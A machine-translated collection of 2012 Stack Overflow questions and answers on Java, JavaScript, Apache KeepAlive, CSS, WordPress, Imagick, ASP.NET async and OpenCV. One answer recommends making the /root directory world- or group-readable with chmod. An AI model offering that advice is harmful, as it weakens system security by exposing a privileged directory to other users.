您必须对它们进行排序（Collections.sort() 可能适用于整数数组列表），并首先删除较大的索引。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T16:38:18.210

如果您的列表中没有重复的字符串，您可以创建一个包含要删除的对象的列表，然后为您的数组列表调用 removeAll(Collection c) 方法。

if`stringList`是您的字符串列表，并且`indexList`是您的索引列表：

```
List<String> toRemove = new ArrayList<String>();

for(Integer i : indexList){
 toRemove.add(stringList.get(i));
}
stringList.removeAll(toRemove); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:10:14.253

```
 for(int i = 0; i < arrayListInt.size(); i++){
    int arrayIndexInIntArray = arrayListInt.get(i);
    int arrayIndexToRemove = 0;
        for (Iterator iterator = arrrayList.getIterator(); iterator.hasNext();) {

                                    String tempString = (String) iterator.next();
                                    if (arrayIndexInIntArray == arrayIndexToRemove) { //Some condition
                                        iterator.remove();//Remove the value at the current iterator
break;
                                    }
arrayIndexToRemove ++;
    }
                                }
    } 
```

试试这个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:11:20.503

您正在寻找的行为最好使用不同的数据结构来实现。我自己想到了一个[HashMap](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/HashMap.html)（另见：[Map](http://docs.oracle.com/javase/6/docs/api/java/util/Map.html)）。

# javascript - javascript从弹出窗口返回值作为没有输入字段的函数中的变量

> ID：13125300
> 
> 赞同：4
> 
> 时间：2012-10-29T16:04:45.080
> 
> 标签：javascript, function, variables, popup, return-value

我知道这个问题看起来像以前的问题，但略有不同。

我想在我的 javascript 中编写一个函数，例如

```
this.imagePopup = function() {
    window.open("images/index.php","imageSelect");
    //some code I don't know....
    return imgUrl;
}; 
```

我需要什么代码才能将弹出窗口中所选图像的 url 设置在变量 imgUrl 中**而不**在文本输入字段中设置值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:18:57.953

您可以在弹出窗口中编写一个 javascript 处理程序来调用开启程序中的方法。例如，以下处理程序方法可以帮助您：

```
function onSelectedIndexChange(ddl) {
    if(opener && ddl) opener.selectImageInPopup = ddl.options[ddl.selectedIndex].value;
}

..

<select onchange="onSelectedIndexChange(this)">... 
```

其中 selectImageInPopup 是开启窗口中的全局变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:10:24.027

第一的：

```
var myWindow = window.open("images/index.php","imageSelect"); 
```

转储您的图像：

```
console.log(myWindow.document.images); 
```

查找所需的一张图片的位置，例如（弹出窗口中的第一张图片）

```
var imgUrl = myWindow.document.images[0].src 
```

祝你好运！

# java - Java MySQL API，根据使用类定义的结构填充结果

> ID：13125301
> 
> 赞同：1
> 
> 时间：2012-10-29T16:04:46.763
> 
> 标签：java, mysql, sql

我在过去看到过这种效果，但我没有找到如何做到这一点，所以我将给出伪代码来演示我记得看到过的东西。

表条目将使用一个类来定义，效果如下。

```
class Person {
    @ (an annotation that specified what SQL type to use for below field)
    String name;
    @ ...
    int age;
} 
```

一个人会进行 SQL 调用，但

```
Person[] persons = sqlconn.select("SELECT * FROM table_name", Person.class) 
```

或类似的东西。

不完全是准备语句，因为这些调用填充了对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-02T01:20:14.270

[Hibernate](http://docs.jboss.org/hibernate/annotations/3.5/reference/en/html_single/#entity-mapping-entity)会为你做这件事，但它的学习曲线相当陡峭。

还有其他 JPA 实现需要考虑，其中一些在[此处](https://stackoverflow.com/questions/576659/jpa-implementations-which-one-is-the-best-to-use)进行了探讨。

一个简单的替代方法是使用 Spring 的 jdbcTemplate，详见[此处](http://www.wetfeetblog.com/spring-jdbc-template-leaner-alternative-fat-hibernate/328)。

# c# - 禁用添加连接选项的 SQL Server Compact 工具箱

> ID：13125305
> 
> 赞同：0
> 
> 时间：2012-10-29T16:04:59.540
> 
> 标签：c#, entity-framework, sql-server-ce-4

最初的问题是我正在尝试将 SQL CE 4.0 与 Entity Framework 5 一起使用。我已经应用了服务包 1，应用了不同的修补程序（如不同论坛和博客中所建议的那样）。

现在，我读到 SQL Server Compact Toolbox 可以管理这些连接，但是当我按照这些步骤操作时，我得到了这个菜单：

![在此处输入图像描述](../Images/b722759fcff87120768c34d94d7c8363.png)

应该启用前两个项目的位置。我的项目是一个 C# WPF 项目。我还读到（来自一年多前的一些帖子）只有 Asp.Net 项目支持此功能（为什么？？），这就是我获得禁用菜单项的原因吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:44:47.650

为了让任何人遇到同样的问题，我已经卸载了 SQL CE 3.5，试图“强制”VisualStudio*不*显示它。它似乎是硬编码的，因为它不起作用。

我重新安装了它（SQL CE 3.5），这些选项不再被禁用。

# kineticjs - 在使用动力学 js 时围绕组中心旋转非对称组

> ID：13125315
> 
> 赞同：1
> 
> 时间：2012-10-29T16:05:18.127
> 
> 标签：kineticjs

我正在尝试在使用 group.setOffset(x,y); 时围绕中心旋转一组 6 个记录。没有成功。有任何想法吗？

# python - 无法使用 matplotlib 和 draw()/ion() 关闭绘图

> ID：13125321
> 
> 赞同：1
> 
> 时间：2012-10-29T16:05:26.680
> 
> 标签：python, matplotlib, draw, glade

我正在尝试使用 matplotlib 绘制一些方程并保持我的主程序运行，所以我开始使用 draw() 而不是 show()。一切都按预期工作，除了我无法关闭情节。我单击绘图 X 按钮，什么也不做。如果我单击主程序上的 X 按钮，它会关闭所有，正如我所期望的那样。

我使用 Glade 制作了一个带有两个按钮（button1 和 button2，链接到代码中的功能）的简单界面。

我的代码如下：

```
import gtk, gobject
from pylab import *
import matplotlib.pyplot as plt

def gtk_main_quit(*args):
    gtk.main_quit() #fecha prog no botao fechar 

def button1(*args):
    path()

def button2(*args):
    simple()

def path(*args):    
    fig = figure()
    plt.ion()
    radius = [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]
    area = [3.14159, 12.56636, 28.27431, 50.26544, 78.53975, 113.09724]
    plt.plot(radius, area)
    plt.draw()

def simple(*args):    
    fig = figure()
    plt.ion()
    t = arange(0.0, 2.0, 0.01)
    s = sin(2*pi*t)
    plot(t, s, linewidth=1.0)    
    grid(True)
    plt.draw()

App = gtk.Builder()
App.add_from_file("Thread.glade")
App.connect_signals(locals())
App.get_object('window1').show()    

gtk.main() 
```

我是否必须为情节设置一些收尾时间？

提前谢谢

# apache - Apache 连接如何工作？

> ID：13125322
> 
> 赞同：0
> 
> 时间：2012-10-29T16:05:27.773
> 
> 标签：apache

服务器提供网页后，Apache 连接是否立即关闭？

此外，如果您将所有静态资产（JS、CSS、图像等）托管在与您的站点相同的服务器上，这对 Apache 连接有何影响？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:09:35.887

1.  Apache 是否在提供页面后立即关闭连接取决于

    1.  客户端是否使用`Connection: Keep-Alive`标头请求它。
    2.  `KeepAlive`和`KeepAliveTimeout`参数的设置。见[http://httpd.apache.org/docs/2.2/mod/core.html#keepalive](http://httpd.apache.org/docs/2.2/mod/core.html#keepalive)
2.  所有类型的内容都使用相同的连接“池”。

好问题：因为所有内容都使用相同的 KeepAlive 设置，您可能希望设置不同的服务器来处理不同类型的内容。

--

对于您的下一个问题：

1.  MaxKeepAliveRequests 记录在同一页面上：[http ://httpd.apache.org/docs/2.2/mod/core.html#maxkeepaliverequests](http://httpd.apache.org/docs/2.2/mod/core.html#maxkeepaliverequests)

这是客户端可以在一个“保持活动连接”上发出的请求总数。如果你有很多服务器资源，你应该保持高。或者，如果您的服务器资源不足或客户端很多，您可以降低它以将客户端发送出去并让其他人轮流。不要忘记，在客户端发出最后一个请求后，服务器仍将等待“KeepAliveTimeout”秒，然后关闭连接并使该工作人员可用于另一个客户端。

1.  MaxRequestsPerChild 记录在这里：[http ://httpd.apache.org/docs/2.2/mod/mpm_common.html#maxrequestsperchild](http://httpd.apache.org/docs/2.2/mod/mpm_common.html#maxrequestsperchild)

它是子服务器进程死亡之前的客户端请求数（以及每个保持活动连接计数为 1 的单个请求）。不同的 MPM（即专门为实现这些子服务器进程的各个平台开发的 Apache 后端）表现不同：

*   线程 MPM 的默认值为 0 = 永不消亡，因为无论如何所有线程都共享相同的内存空间。
*   对于使用单个子进程的 MPM，让子进程每隔一段时间就死掉更有意义（如果有的话，可能会清理服务器资源和内存泄漏）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:12:41.793

你的问题的答案是也许。根据您的`KeepAlive`设置，连接可能会保持打开状态。如果您`KeepAlive`完全关闭，则在满足请求后连接将关闭。如果您有`KeepAlive`on （这是更典型的），那么连接将保持一段可配置的时间量，等待来自分配连接的客户端的另一个请求。

请求是针对动态生成的页面还是针对静态内容的，与此行为无关，但是在从服务器下载静态内容时，您最终会重用浏览器建立的连接，如果`KeepAlive`是上。这可以提供更好的性能，因为您没有为每个请求重新建立连接的开销。

这是一篇关于考虑使用的好文章的链接`KeepAlive`

[http://abdussamad.com/archives/169-Apache-optimization:-KeepAlive-On-or-Off.html](http://abdussamad.com/archives/169-Apache-optimization:-KeepAlive-On-or-Off.html)

# java - ArrayIndexOutOfBoundsException 在实施埃拉托色尼筛法时

> ID：13125333
> 
> 赞同：1
> 
> 时间：2012-10-29T16:05:49.187
> 
> 标签：java, exception, sieve-of-eratosthenes

当我运行我的程序时，出现以下异常：

```
Exception in thread "main" java.lang.ArrayIndexOutOfBoundsException: 1
        at eraKevgiri.main(eraKevgiri.java:29) 
```

这段代码有什么问题？

```
public static void main(String[] args) {
    int gSayi = 0;
    int kKok = (int) Math.sqrt(gSayi);
    boolean[] liste = new boolean[gSayi + 1];

    Scanner klavye = new Scanner(System.in);
    System.out.println("Sayı Girin:");
    gSayi = klavye.nextInt();

    for(int i=2; i<=kKok; i++){
        System.out.println("" +i);
        for(int j=i*i; j<=gSayi; j+=i){
            liste[j] = true;
        }
    }

    for(int k=kKok; k<=gSayi; k++){ 
        if(!liste[k]){ //-------> problem in here
            System.out.println("" + k);
        }
    }
    klavye.close();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:10:32.623

你应该搬家

```
Scanner klavye = new Scanner(System.in);
System.out.println("Sayı Girin:");
gSayi = klavye.nextInt(); 
```

到方法的开头，否则数组将始终只有一个元素，然后当然没有索引为 1 的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:12:08.860

您首先分配一个大小为 的数组`gSayi + 1`，即`0 + 1 = 1`. 稍后，您修改`gSayi`并尝试访问`liste`只有一个元素的 元素。

因此，您不得修改`gSayi`或将数组调整为修改后的值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:12:51.763

你做事的顺序不对。你打电话时：

```
boolean[] liste = new boolean[gSayi + 1]; 
```

您正在创建一个只有一个元素的数组，因为`gSayi + 1`它总是`1`在这里。像这样移动你的代码：

```
Scanner klavye = new Scanner(System.in);
System.out.println("Sayı Girin:");
int gSayi = 0;
gSayi = klavye.nextInt();
int kKok = (int) Math.sqrt(gSayi);
boolean[] liste = new boolean[gSayi + 1]; 
```

数组的大小不会因为您更新而改变`gSayi`。同样`kKok`，它不会更新为 的新平方根`gSayi`。它将使用该时间实例的值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:13:05.170

`for(int k=kKok; k<=gSayi; k++)`这里 gSayi 的值取自用户。因此，如果它大于 1，那么它会在`boolean[] liste`大小为 1 时引发错误。这就是超出范围的原因`liste[k]`。

你应该把`liste`它变成动态的，例如列表。

# html - ie7浮动div左填充问题

> ID：13125334
> 
> 赞同：0
> 
> 时间：2012-10-29T16:05:51.393
> 
> 标签：html, css

我正在尝试使用底部列修复[此站点的ie7 问题。](http://www.community.hallgreenchristadelphians.co.uk/)这 3 列应总计 960 像素并占据容器的整个宽度，但由于某种原因，填充存在问题。我检查了最新的 firefox/chrome，效果很好。如果有人可以帮助我，那就太好了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:09:24.187

尝试使用此文档类型：

`<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:39:34.100

我不太确定，但尝试显示内联浮动元素。

```
.selector{
    display:inline;
} 
```

# php - WordPress 侧边栏菜单不适用于 CSS

> ID：13125344
> 
> 赞同：0
> 
> 时间：2012-10-29T16:06:49.007
> 
> 标签：php, wordpress, css

我无法使用我的 CSS 设置侧边栏菜单的样式。我只需要它与当前的 CSS 一起工作，这样我就可以将它调整为我需要的外观。我在 functions.php 中声明了侧边栏菜单，并在 WordPress 的管理区域中创建了一个菜单，但它似乎根本没有改变任何东西。

这是页面的链接（侧边栏菜单是我们的部门）：[查看页面](http://test.snowflakesoftware.com/)

下面是 sidebar.php 文件中的代码。

```
<div id="mod_sidebar">
    <?php if ( ! dynamic_sidebar( 'Sidebar' )) : ?>
    <ul>

        <li id="sidebar-nav" class="widget menu">
            <h3><?php _e('Navigation'); ?></h3>
            <ul>
                <?php wp_nav_menu( array( 'theme_location' => 'sidebar-menu' ) ); /* editable within the Wordpress backend */ ?>
            </ul>
        </li>

        <li id="sidebar-search" class="widget">
            <h3><?php _e('Search'); ?></h3>
            <?php get_search_form(); /* outputs the default Wordpress search form */ ?>
        </li>

        <li id="sidebar-archives" class="widget">
            <h3><?php _e('Archives') ?></h3>
            <ul>
                <?php wp_get_archives( 'type=monthly' ); ?>
            </ul>
        </li>

        <li id="sidebar-meta" class="widget">
            <h3><?php _e('Meta') ?></h3>
            <ul>
                <?php wp_register(); ?>
                <li><?php wp_loginout(); ?></li>
                <?php wp_meta(); ?>
            </ul>
        </li>
    </ul>
    <?php endif; ?>
</div><!--mod_sidebar--> 
```

下面基本上是该 Menu 的 CSS：

```
#sidebar-nav,
#sidebar-nav ul {list-style: none; padding: 0; margin: 0; border-radius: 5px; -moz-border-radius: 5px; font-weight: bold;}
#sidebar-nav a {display: block; padding: 10px; width: 210px;}
#sidebar-nav li {float: left; width: 150px;}
#sidebar-nav li:hover {background-color: #5da3e3; border-radius: 5px; -moz-border-radius: 5px;}
#sidebar-nav li ul {position: absolute; width: 210px; left: -999em; background-color: #1662a7;}
#sidebar-nav li:hover ul {left: auto; border-radius: 5px; -moz-border-radius: 5px;} 
```

谁能帮我？！

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:12:51.357

试试这个（但你可以使用 class `<div class="some_class_name">`）：

```
 #mod_sidebar,
    #mod_sidebar ul {list-style: none; padding: 0; margin: 0; border-radius: 5px; -moz-border-radius: 5px; font-weight: bold;}
    #mod_sidebar a {display: block; padding: 10px; width: 210px;}
    #mod_sidebar li {float: left; width: 150px;}
    #mod_sidebar li:hover {background-color: #5da3e3; border-radius: 5px; -moz-border-radius: 5px;}
    #mod_sidebar li ul {position: absolute; width: 210px; left: -999em; background-color: #1662a7;}
    #mod_sidebar li:hover ul {left: auto; border-radius: 5px; -moz-border-radius: 5px;} 
```

# javascript - D3 使用 d3.selectAll() 给我一个语法错误

> ID：13125347
> 
> 赞同：0
> 
> 时间：2012-10-29T16:07:00.240
> 
> 标签：javascript, jquery, syntax-error, d3.js

我的场景是这样的：我正在尝试从类列表中选择一个类，该类以数字开头，但类型为字符串（我检查过）。

```
list_item.on("click", function(){
  var to_find = $(this).text().replace(/\s/g, "_");

  console.log(typeof(to_find)); // on a certain moment this will become "00s"

  sampleSVG.selectAll(".node:not(."+to_find+") circle, .line:not(."+to_find+")")
    .transition()
    .duration(500)
    .style("fill", st_colours.node.fill)
    .style("stroke", function(d){return d.type == "node" ? st_colours.node.stroke : st_colours.line.stroke});

  sampleSVG.selectAll(".node."+to_find+" circle, .line."+to_find)
    .transition()
    .duration(1000)
    .style("fill", st_colours.random(a))
    .style("stroke", d3.rgb(st_colours.random(a)).darker());
}); 
```

当“var to_find”变为“00s”时，我收到此错误：

```
SyntaxError: An invalid or illegal string was specified 
```

谁能告诉我为什么我会收到这个错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T17:42:06.407

在您的选择器中，您指的是一个名为 00s 的类：

```
.node:not(.00s) 
```

根据 CSS 语法，类名应该以下划线、破折号或字母开头。也许这就是您遇到 SyntaxError 的原因。

另请参阅：[哪些字符在 CSS 类名/选择器中有效？](https://stackoverflow.com/questions/448981/what-characters-are-valid-in-css-class-names)

# java - 使用java列出linux中的子目录/文件

> ID：13125351
> 
> 赞同：1
> 
> 时间：2012-10-29T16:07:08.693
> 
> 标签：java, linux, filesystems

我试图以普通用户身份在 Linux 上运行此代码，但由于权限不足，listfiles() 返回 null。

```
File parentDirectory = new File("/root");
File[] childFiles = parentDirectory.listFiles(); 
```

如何在不以 SU 模式运行 java 应用程序的情况下运行上述代码。

*   我可以要求用户输入root密码吗？这样我就可以运行 linux 命令而不是 java 函数。

我必须在java中实现这一目标的所有选项？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:14:20.807

您可以使`/root/`目录对世界可读或对组可读。在后一种情况下，您还必须将运行程序的用户添加到适当的组中。

世界可读：

```
sudo chmod o+r /root 
```

组可读：

```
sudo chmod g+r /root 
```

# php - readimageblob：将 SVG 转换为 PNG 时出现致命错误

> ID：13125352
> 
> 赞同：10
> 
> 时间：2012-10-29T16:07:13.413
> 
> 标签：php, jquery, json, imagick

我正在尝试使用带有 PHP 的 Image-Magick 将 SVG 文本转换为 PNG 图像。这个 SVG 是用[NVD3](http://nvd3.com/)生成的图表，我想允许我的用户将它作为图像下载。

基本上，我将使用 JSON 编码的 SVG 数据发送到 PHP 处理程序，该处理程序应该将其输出为 PNG 图像。

但是，这会引发以下错误：

```
Fatal error: Uncaught exception 'ImagickException' with message 'no decode delegate for this image format `' @ blob.c/BlobToImage/347' in svg2png.php:4 Stack trace: #0 svg2png.php(4): Imagick->readimageblob(' 
```

用于转换图像的**PHP 脚本：**

```
<?php
    /* Derived in part from: http://stackoverflow.com/a/4809562/937891 */
    $svg=json_decode($_REQUEST["svgData"]);
    $im=new Imagick();
    $im->readImageBlob($svg);
    $im->setImageFormat("png24");
    header("Content-Type: image/png");
    $thumbnail = $im->getImageBlob();
    echo $thumbnail;
?> 
```

**HTML：**

```
<form id="exportSpendTrendTrigger" method="POST" action="svg2png.php" target="_blank">
    <input id="exportSpendTrendSvgData" type="hidden" name="svgData" />
    <input type="submit" class="btn" value="Export" />
</form>
<div id="spendtrend">
    <svg></svg>
</div> 
```

**jQuery：**

```
exportSpendTrend = function (e) {
    //Show the user the PNG-image version for download
    $("#exportSpendTrendSvgData").val( JSON.stringify($("#spendtrend").html().trim()) );
}

$("#exportSpendTrendTrigger").on("submit", exportSpendTrend); 
```

**由 NVD3 生成的**SVG示例：** [http ://pastebin.com/Z3TvDK16](http://pastebin.com/Z3TvDK16)**

 **这是在带有 PHP 5.3 和 Imagick 的 Ubuntu 服务器上

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-25T12:03:31.123

需要指定 svg 文件文本结构`readImageBlob`来解码文件。`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`在您的变量前添加 svg 文本。

```
$svg = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'.$svg; 
```

你很高兴。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-09-27T16:53:41.823

记住这一点

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?> 
```

必须是包含 SVG 文本的变量中的第一行。知道这一点可能会为您省去一些麻烦。**

# c# - 如何获取类型的规范化 XML 文档名称？

> ID：13125353
> 
> 赞同：1
> 
> 时间：2012-10-29T16:07:15.077
> 
> 标签：c#, .net, types, xml-documentation

如何获得与 XML 文档输出文件中使用的名称相对应的类型名称？

我认为 XML 文档使用全名，但事实并非如此。例如全称`Collection<long>`是：

> System.Collections.Generic.ICollection`1[[System.Int64, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]])

而对应于类型属性的 XML 文档`Collection<long>`是：

> System.Collections.Generic.ICollection{System.Int64}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:18:37.183

XML 文档使用完全限定的类名；例如命名空间和类名。请参阅[http://msdn.microsoft.com/en-us/library/system.type.fullname.aspx](http://msdn.microsoft.com/en-us/library/system.type.fullname.aspx)

您的示例（使用 PublicKey）是该类的完全限定的**AssemblyName**；这通常仅在您需要动态加载类型时使用。

泛型的 XML 文档约定是使用 '{T}' 使其更易于键入，如 . 没有使用“集合”，因为 '<' 在 XML 中是特殊的！

# sql - 在 UML 和 SQL 中实现类的特例

> ID：13125355
> 
> 赞同：0
> 
> 时间：2012-10-29T16:07:24.720
> 
> 标签：sql, database, uml

在允许注册用户创建可由其他注册用户编辑的页面的应用程序中，在 UML 和 SQL 中区分普通用户和页面创建者的正确方法是什么。

在 UML 中，我有

```
--------  accesible by --------  
| Page |  ------------ |User  |
--------               --------
  |created by            / \
  |                       | 
  |                       |
---------   is a          |
|Creator|------------------
--------- 
```

现在，我认为这不是正确的 UML。那么，什么是我试图表达的正确 UML 表示。最终，我想为它创建 SQL 数据库。在那种情况下，数据库模式会是什么样子？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T08:57:41.753

在这种情况下，您的角色应该是特定的，意味着角色应该具有不同的访问权限。假设我有三个用户，每个角色都有不同的访问权限。1 Admin 2 Manager 3 User 在这种情况下，管理员可以创建页面并有权编辑页面和用户的所有详细信息，而经理有权创建页面并根据访问权限编辑该页面的一些详细信息。用户只能创建和查看页面，不能编辑页面的详细信息。访问级别应在数据库中定义。

我希望这能帮到您

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T19:41:37.923

与往常一样，您有多种可能性——模型（UML）和代码（SQL 或其他）。

模型 A）就像您在上面描述的模型 B）只有一个用户类，没有创建者。用户是页面中两个关联的目标：“可访问者”和“创建者”

模型之间的区别在于，您可以在模型 A 中区分可以创建页面的用户和不能创建页面的用户。模型 B 只允许区分已经创建页面的用户和尚未创建页面的用户。

两种模型都可能由两种实现方式实现。

代码 1）使用 5 个表：Page、User、Creator、PageToUser、PageToCreator 代码 2）使用 4 个表：Page、User、PageToUserAccessible、PageToUserCreated（可能还有用户中的标志“创建者”）代码 3）使用 3 个表：Page、用户、PageToUser 和 PageToUser 中的“创建”标志（可能加上用户中的标志“创建者”）

知道了？一切都是“正确的” - 这取决于你:)

# ruby-on-rails - 将 rails_admin 配置作为 mixin 包含在内

> ID：13125359
> 
> 赞同：1
> 
> 时间：2012-10-29T16:07:47.417
> 
> 标签：ruby-on-rails, ruby, rails-admin

我不确定为什么这对我不起作用，但我希望将 rails_admin 范围内的每个模型的配置作为我包含在模型中的 mixin。这给了我关注点分离的好处，同时避免了每次我进行更改时都必须重新启动服务器，这将是仅使用 rails_admin.rb 文件的问题。

所以我有一个模型，app/models/section.rb

```
class Section
  include SectionAdmin 
```

在models/section_admin.rb（我把它放在这里让它在移动到lib之前工作）我有：

```
module SectionAdmin
  rails_admin do 
    ... 
```

但我得到了错误：

```
undefined method `rails_admin' for main:Object 
```

这让我很困惑，因为作为一个 mixin，我认为它在被包含之前没有被评估过。这也令人困惑，因为即使我在模块中包含 'require "rails_admin"' 我仍然会收到错误消息。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-21T12:32:58.643

这在 rails 4.0.0 中为我工作

```
# models/admin/user.rb
module Admin
  module User

    ::User.rails_admin do 

      list do
        field :name
        field :email
      end    

    end

  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-19T19:32:58.123

我发现这是在 Rails 4 中处理这个问题的最干净的方法

我的顾虑：

```
# models/concerns/rails_admin_posts.rb
module RailsAdminPosts
  extend ActiveSupport::Concern

  included do
    rails_admin do
      ...
    end
  end
end 
```

我的模型：

```
# models/post.rb
class Post < ActiveRecord::Base
  include RailsAdminPosts

  ...

end 
```

# asp.net - ASP.NET 4.5 异步等待和 Response.Redirect

> ID：13125361
> 
> 赞同：9
> 
> 时间：2012-10-29T16:07:53.173
> 
> 标签：asp.net, .net, redirect, asynchronous, async-await

使用-时有什么方法可以从`Page_Load`（或任何其他 ASP.NET 事件）重定向？当然会抛出，但即使我抓住它-它最终会出现错误页面。如果我调用它不会崩溃，但我需要停止执行页面（渲染页面等），所以这不是解决方案。正如我注意到这两种方法的作用不同：`async``await``Redirect``ThreadAbortException``try``catch``Response("url", false)`

这以 ThreadAbortException 结束（我假设任务同步结束）：

```
protected async void Page_Load()
{
    await Task.Run(() => { });
    Response.Redirect("http://www.google.com/");
} 
```

这个在 Response.Redirect 之后继续：

```
protected async void Page_Load()
{
    await Task.Delay(1000);
    Response.Redirect("http://www.google.com/");
} 
```

我必须等待响应，但我正在试验，即使我删除了`await`关键字（所以任务在后台运行并且方法继续）它最终还是一样。唯一有帮助的是删除`async`关键字 - 我认为`async`只有启用`await`，仅此而已？！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-02T15:46:00.267

好的，我找到了如何处理的答案。

我在我的基 Page 类中创建了一个 Redirect 方法包装器：

```
protected void Redirect(string url)
{
    this.isRedirecting = true;

    Response.Redirect(url, false);

    if (Context.ApplicationInstance != null)
        Context.ApplicationInstance.CompleteRequest();
} 
```

并覆盖`Render`和`RaisePostBackEvent`：

```
protected override void Render(HtmlTextWriter writer)
{
    if (this.isRedirecting)
        return;
}

protected override void RaisePostBackEvent(IPostBackEventHandler sourceControl, string eventArgument)
{
    if (!this.isRedirecting)
        base.RaisePostBackEvent(sourceControl, eventArgument);
} 
```

这就是诀窍。在所有等待的任务完成之前， ASP.NET 4.5 不会触发`PreRenderComplete`事件（= 在生命周期中不会继续）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-30T11:39:03.660

免责声明：我没有使用过`async`/`await`但以下内容基于我对文档的阅读。

据我了解，只要您`await`在代码中有一个，它将异步调用提供的任务，并且该方法的其余部分实际上转换为回调方法。所以在这种情况下，因为`Page_Load`它在运行它时是异步的，并且它会在等待其异步任务完成时将控制权返回给调用者。

在这种情况下`Page_Load`，我认为，这将看起来好像它已经完成，所以页面生命周期将继续到下一步。

差异的原因是，在您的第一个示例中，尽管它会继续生命周期，但回调几乎是立即的，因此`Response.Redirect`在页面的其余部分有机会做任何事情之前几乎会立即运行。

在第二个的情况下，您有 1000 的延迟，并且在此期间页面将继续运行其他内容，并且只有当延迟结束时才会触发 respone.redirect。这可能是在响应（来自错误）已经被触发之后。

所以本质上`async`确实启用`await`了，但`await`听起来它比你预期的要多一点。

# actionscript-3 - 如何更新 adobe air 原生菜单？

> ID：13125364
> 
> 赞同：-1
> 
> 时间：2012-10-29T16:07:58.233
> 
> 标签：actionscript-3, apache-flex, air, adobe

如何在 adobe air 应用程序中更新我的本机菜单以侦听 on select 事件？例如，当系统加载时，应用程序将显示“登录”选项。当用户单击它并登录时，如何将菜单更改为“退出”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:17:52.393

为此，您需要动态更改菜单文本。只需更改链接的文本属性

![在此处输入图像描述](../Images/d9cc700684783e18ec4a55fbfdd23ca4.png)

# opencv - opencv2 HOG 代码中的运行时错误 SIGSEV

> ID：13125365
> 
> 赞同：1
> 
> 时间：2012-10-29T16:08:02.047
> 
> 标签：opencv, gradient, runtime-error, histogram, integral

我得到了这段代码，我正在处理，从[http://smsoftdev-solutions.blogspot.com/2009/08/integral-histogram-for-fast-calculation.html](http://smsoftdev-solutions.blogspot.com/2009/08/integral-histogram-for-fast-calculation.html)中提取。

目前将该页面上的代码导入到 opencv2 c++ 实现中，这就是我到目前为止所拥有的。

主要的

* * *

```
using namespace cv;
using namespace std;

//CONSTANTES
#define PI 3.142

//FUNCIONES
vector<Mat> extractIntegralHist(Mat in, const int _nbins);

int main(int argc, char *argv[])
{
//Definicion de variables
    Mat frame;
    vector<Mat> integrals(9);
    namedWindow("main_video",WINDOW_AUTOSIZE);
    namedWindow("temporal_window",WINDOW_AUTOSIZE);

//Inicializa la captura del video
    VideoCapture cap(0);
       if(!cap.isOpened()){
           return -1;
           cout << "No se puede capturar";
       }

//Loop principal
    while(1){
       cap >> frame;
       imshow("main_video",frame);
       waitKey(1);

       extractIntegralHist(frame, 9);

    }
    integrals.clear();
} 
```

功能

* * *

```
//CALCULAR HISTOGRAMAS DE INTEGRALES
vector<Mat> extractIntegralHist(Mat in, const int _nbins){
    Mat in_gray;
    int x,y;
    float temp_gradient,temp_magnitude;
    namedWindow("temporal_window",WINDOW_AUTOSIZE);
//Convierte la imagen a escala de grises y normaliza
    cvtColor(in,in_gray,CV_RGB2GRAY);
    equalizeHist(in_gray,in_gray);
//Calcula la derivada de la imagen en gris en direccion x,y utilizando sobel
    Mat xsobel, ysobel;
    Sobel(in_gray, xsobel, CV_32FC1, 1, 0, 1);
    Sobel(in_gray, ysobel, CV_32FC1, 0, 1, 1);
    in_gray.release();
//Crea la matriz de 9 imagenes contenedoras -- REVISAR ESTE CODIGO
    vector<Mat> bins(_nbins);
    for (int i = 0; i < _nbins ; i++) {
        bins[9] = Mat::zeros(in.size(),CV_32F);
    }
//Crea la matriz donde se guardaran las integrales de la imagen
    vector<Mat> integrals(_nbins);
    for (int i = 0; i < _nbins ; i++) {
        integrals[9] = Mat(Size(in_gray.cols+1,in_gray.rows+1),CV_64F);
    }
//Calcula los contenedores
    for(y=0;y<in.rows;y++){

        float* xSobelPtr = (float*) (xsobel.row(y).data);
        float* ySobelPtr = (float*) (ysobel.row(y).data);

        float** binsRowPtrs = new float *[_nbins];
        for (int i = 0; i < _nbins; i++){
            binsRowPtrs[i] = (float*) (bins[i].row(y).data);
        }
